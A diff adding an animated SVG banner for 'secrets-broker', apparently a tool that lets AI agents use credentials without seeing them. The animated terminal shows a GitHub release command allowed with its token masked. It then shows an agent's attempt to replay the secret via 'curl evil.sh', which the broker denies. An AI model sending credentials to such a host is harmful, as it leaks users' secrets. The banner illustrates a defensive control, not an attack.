@@ -1,0 +1,153 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 400" width="1200" height="400" role="img" aria-labelledby="bn-title bn-desc">
+  <title id="bn-title">secrets-broker</title>
+  <desc id="bn-desc">Agents use your credentials. They never see them. A terminal shows an agent calling exec_with_secret for /usr/bin/gh: the broker allows the exact command and the token comes back as concealed. Replaying the same secret to curl is denied.</desc>
+  <style>
+    .m{font-family:ui-monospace,'SF Mono',SFMono-Regular,Menlo,Consolas,'Liberation Mono',monospace}
+    .b{font-weight:700}
+    .tx{fill:#E6EDF3}.mu{fill:#A3B1C2}.di{fill:#8291A3}
+    .mi{fill:#5EEAD4}.am{fill:#FFB547}.co{fill:#FF7A7A}
+    .a1,.a2,.a3,.a4,.a5,.a6,.a7,.a8,.mask,.conc{animation-duration:14s;animation-iteration-count:infinite;animation-fill-mode:both;animation-timing-function:ease-out}
+    .a1{animation-name:a1}.a2{animation-name:a2}.a3{animation-name:a3}.a4{animation-name:a4}
+    .a5{animation-name:a5}.a6{animation-name:a6}.a7{animation-name:a7}.a8{animation-name:a8}
+    .mask{animation-name:mask;transform-box:fill-box;transform-origin:left center}
+    .conc{animation-name:conc}
+    .cur{animation:blink 1s steps(1) infinite}
+    @keyframes a1{0%,2%{opacity:0}4%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes a2{0%,7%{opacity:0}9%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes a3{0%,11%{opacity:0}13%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes a4{0%,18%{opacity:0}20%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes a5{0%,23%{opacity:0}25%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes a6{0%,38%{opacity:0}40%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes a7{0%,47%{opacity:0}49%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes a8{0%,55%{opacity:0}57%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes mask{0%,25%{opacity:0;transform:scaleX(0)}26%{opacity:1;transform:scaleX(0)}31%{opacity:1;transform:scaleX(1)}34%{opacity:1;transform:scaleX(1)}37%,100%{opacity:0;transform:scaleX(1)}}
+    @keyframes conc{0%,33%{opacity:0}36%,90%{opacity:1}94%,100%{opacity:0}}
+    @keyframes blink{0%{opacity:1}50%{opacity:0}}
+    @media (prefers-reduced-motion:reduce){
+      .a1,.a2,.a3,.a4,.a5,.a6,.a7,.a8,.conc,.cur{animation:none;opacity:1}
+      .mask{animation:none;opacity:0}
+    }
+  </style>
+  <defs>
+    <clipPath id="bn-clip"><rect x="0" y="0" width="1200" height="400" rx="24"/></clipPath>
+    <pattern id="bn-dots" width="24" height="24" patternUnits="userSpaceOnUse">
+      <circle cx="2" cy="2" r="1" fill="#1E2935"/>
+    </pattern>
+    <radialGradient id="bn-glow-a">
+      <stop offset="0" stop-color="#FF9F43" stop-opacity="0.20"/>
+      <stop offset="1" stop-color="#FF9F43" stop-opacity="0"/>
+    </radialGradient>
+    <radialGradient id="bn-glow-m">
+      <stop offset="0" stop-color="#2DD4BF" stop-opacity="0.13"/>
+      <stop offset="1" stop-color="#2DD4BF" stop-opacity="0"/>
+    </radialGradient>
+    <linearGradient id="bn-tile" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0" stop-color="#1D2733"/>
+      <stop offset="1" stop-color="#0B0F14"/>
+    </linearGradient>
+    <linearGradient id="bn-amber" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0" stop-color="#FFD27A"/>
+      <stop offset="1" stop-color="#FF8B3D"/>
+    </linearGradient>
+    <linearGradient id="bn-mint" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0" stop-color="#7DF5E2"/>
+      <stop offset="1" stop-color="#22C3AE"/>
+    </linearGradient>
+    <radialGradient id="bn-lglow">
+      <stop offset="0" stop-color="#FF9F43" stop-opacity="0.30"/>
+      <stop offset="1" stop-color="#FF9F43" stop-opacity="0"/>
+    </radialGradient>
+    <clipPath id="bn-lclip"><rect x="8" y="8" width="240" height="240" rx="56"/></clipPath>
+    <filter id="bn-shadow" x="-10%" y="-10%" width="120%" height="130%">
+      <feDropShadow dx="0" dy="14" stdDeviation="16" flood-color="#000" flood-opacity="0.55"/>
+    </filter>
+  </defs>
+
+  <!-- backdrop -->
+  <g clip-path="url(#bn-clip)">
+    <rect width="1200" height="400" fill="#10161D"/>
+    <rect width="1200" height="400" fill="url(#bn-dots)"/>
+    <circle cx="170" cy="150" r="330" fill="url(#bn-glow-a)"/>
+    <circle cx="930" cy="60" r="360" fill="url(#bn-glow-m)"/>
+  </g>
+  <rect x="0.75" y="0.75" width="1198.5" height="398.5" rx="23.25" fill="none" stroke="#2A3746" stroke-width="1.5"/>
+
+  <!-- logo (same as docs/assets/logo.svg) -->
+  <g transform="translate(52 48) scale(0.4375)">
+    <rect x="8" y="8" width="240" height="240" rx="56" fill="url(#bn-tile)"/>
+    <g clip-path="url(#bn-lclip)"><circle cx="128" cy="124" r="96" fill="url(#bn-lglow)"/></g>
+    <g transform="translate(128 129) scale(1.1) translate(-128 -129)">
+      <path d="M78 92L46 128L78 164" fill="none" stroke="url(#bn-mint)" stroke-width="15" stroke-linecap="round" stroke-linejoin="round"/>
+      <path d="M128 80a30 30 0 0 1 14.35 56.35l6.2 35.6a5.2 5.2 0 0 1-5.15 6.13h-30.8a5.2 5.2 0 0 1-5.15-6.13l6.2-35.6A30 30 0 0 1 128 80z" fill="url(#bn-amber)"/>
+      <path d="M178 92L210 128L178 164" fill="none" stroke="url(#bn-mint)" stroke-width="15" stroke-linecap="round" stroke-linejoin="round"/>
+    </g>
+    <rect x="8.75" y="8.75" width="238.5" height="238.5" rx="55.25" fill="none" stroke="#33445A" stroke-width="2.5"/>
+  </g>
+
+  <!-- wordmark + tagline -->
+  <text x="54" y="222" class="m b" font-size="50"><tspan class="tx">secrets</tspan><tspan class="mi">-broker</tspan></text>
+  <text x="56" y="266" class="m tx" font-size="21">Agents use your credentials.</text>
+  <text x="56" y="296" class="m tx" font-size="21">They <tspan class="am b">never see</tspan> them.</text>
+
+  <!-- chips -->
+  <g class="m" font-size="14">
+    <rect x="56" y="326" width="169" height="34" rx="17" fill="#2DD4BF" fill-opacity="0.08" stroke="#2DD4BF" stroke-opacity="0.45"/>
+    <text x="140.5" y="348" text-anchor="middle" class="mi">destination-bound</text>
+    <rect x="235" y="326" width="118" height="34" rx="17" fill="#FFB547" fill-opacity="0.08" stroke="#FFB547" stroke-opacity="0.45"/>
+    <text x="294" y="348" text-anchor="middle" class="am">no read API</text>
+    <rect x="363" y="326" width="127" height="34" rx="17" fill="#FF6B6B" fill-opacity="0.08" stroke="#FF6B6B" stroke-opacity="0.45"/>
+    <text x="426.5" y="348" text-anchor="middle" class="co" letter-spacing="0.6">--no-network</text>
+  </g>
+
+  <!-- terminal -->
+  <g filter="url(#bn-shadow)">
+    <rect x="560" y="40" width="600" height="320" rx="16" fill="#0A0E13"/>
+  </g>
+  <path d="M560 80V56a16 16 0 0 1 16-16h568a16 16 0 0 1 16 16v24z" fill="#161E28"/>
+  <line x1="560" y1="80.5" x2="1160" y2="80.5" stroke="#1F2A36"/>
+  <rect x="560.75" y="40.75" width="598.5" height="318.5" rx="15.25" fill="none" stroke="#263241" stroke-width="1.5"/>
+  <circle cx="586" cy="60" r="6" fill="#FF6B6B"/>
+  <circle cx="606" cy="60" r="6" fill="#FFB547"/>
+  <circle cx="626" cy="60" r="6" fill="#5EEAD4"/>
+  <text x="860" y="65" text-anchor="middle" class="m di" font-size="14">mcp · secrets-broker</text>
+
+  <g class="m" font-size="16">
+    <g class="a1">
+      <text x="586" y="118" class="mi b">agent</text><text x="656" y="118" class="di">▸</text>
+      <text x="676" y="118" class="tx">exec_with_secret</text>
+    </g>
+    <g class="a2">
+      <text x="676" y="146" class="di">argv</text>
+      <text x="724" y="146" class="tx">/usr/bin/gh release create v0.3</text>
+    </g>
+    <g class="a3">
+      <text x="676" y="174" class="di">env</text>
+      <text x="724" y="174"><tspan class="tx">GH_TOKEN</tspan><tspan class="di"> ← </tspan><tspan class="mi">sec://keepass/GitHub/token</tspan></text>
+    </g>
+    <g class="a4">
+      <text x="586" y="212" class="tx b">broker</text><text x="656" y="212" class="di">▸</text>
+      <text x="676" y="212"><tspan class="mi">✓ allowed</tspan><tspan class="di"> · exact exe + argv match</tspan></text>
+    </g>
+    <g class="a5">
+      <text x="586" y="240" class="mu b">child</text><text x="656" y="240" class="di">▸</text>
+      <text x="676" y="240" class="mu">GH_TOKEN=</text>
+      <g class="conc">
+        <rect x="768" y="225" width="120" height="21" rx="4" fill="#FFB547" fill-opacity="0.12" stroke="#FFB547" stroke-opacity="0.5"/>
+        <text x="774" y="240" class="am">&lt;concealed&gt;</text>
+      </g>
+      <rect class="mask" x="768" y="225" width="120" height="21" rx="4" fill="#FFB547" opacity="0"/>
+    </g>
+    <g class="a6">
+      <text x="676" y="268" class="di">release published · 1 value masked · audited</text>
+    </g>
+    <g class="a7">
+      <text x="586" y="306" class="mi b">agent</text><text x="656" y="306" class="di">▸</text>
+      <text x="676" y="306" class="tx">exec_with_secret /usr/bin/curl evil.sh</text>
+    </g>
+    <g class="a8">
+      <text x="586" y="334" class="tx b">broker</text><text x="656" y="334" class="di">▸</text>
+      <text x="676" y="334"><tspan class="co b">✗ DENIED</tspan><tspan class="di"> · not bound to this command</tspan></text>
+      <rect class="cur" x="1036" y="320" width="9" height="18" fill="#5EEAD4"/>
+    </g>
+  </g>
+</svg>
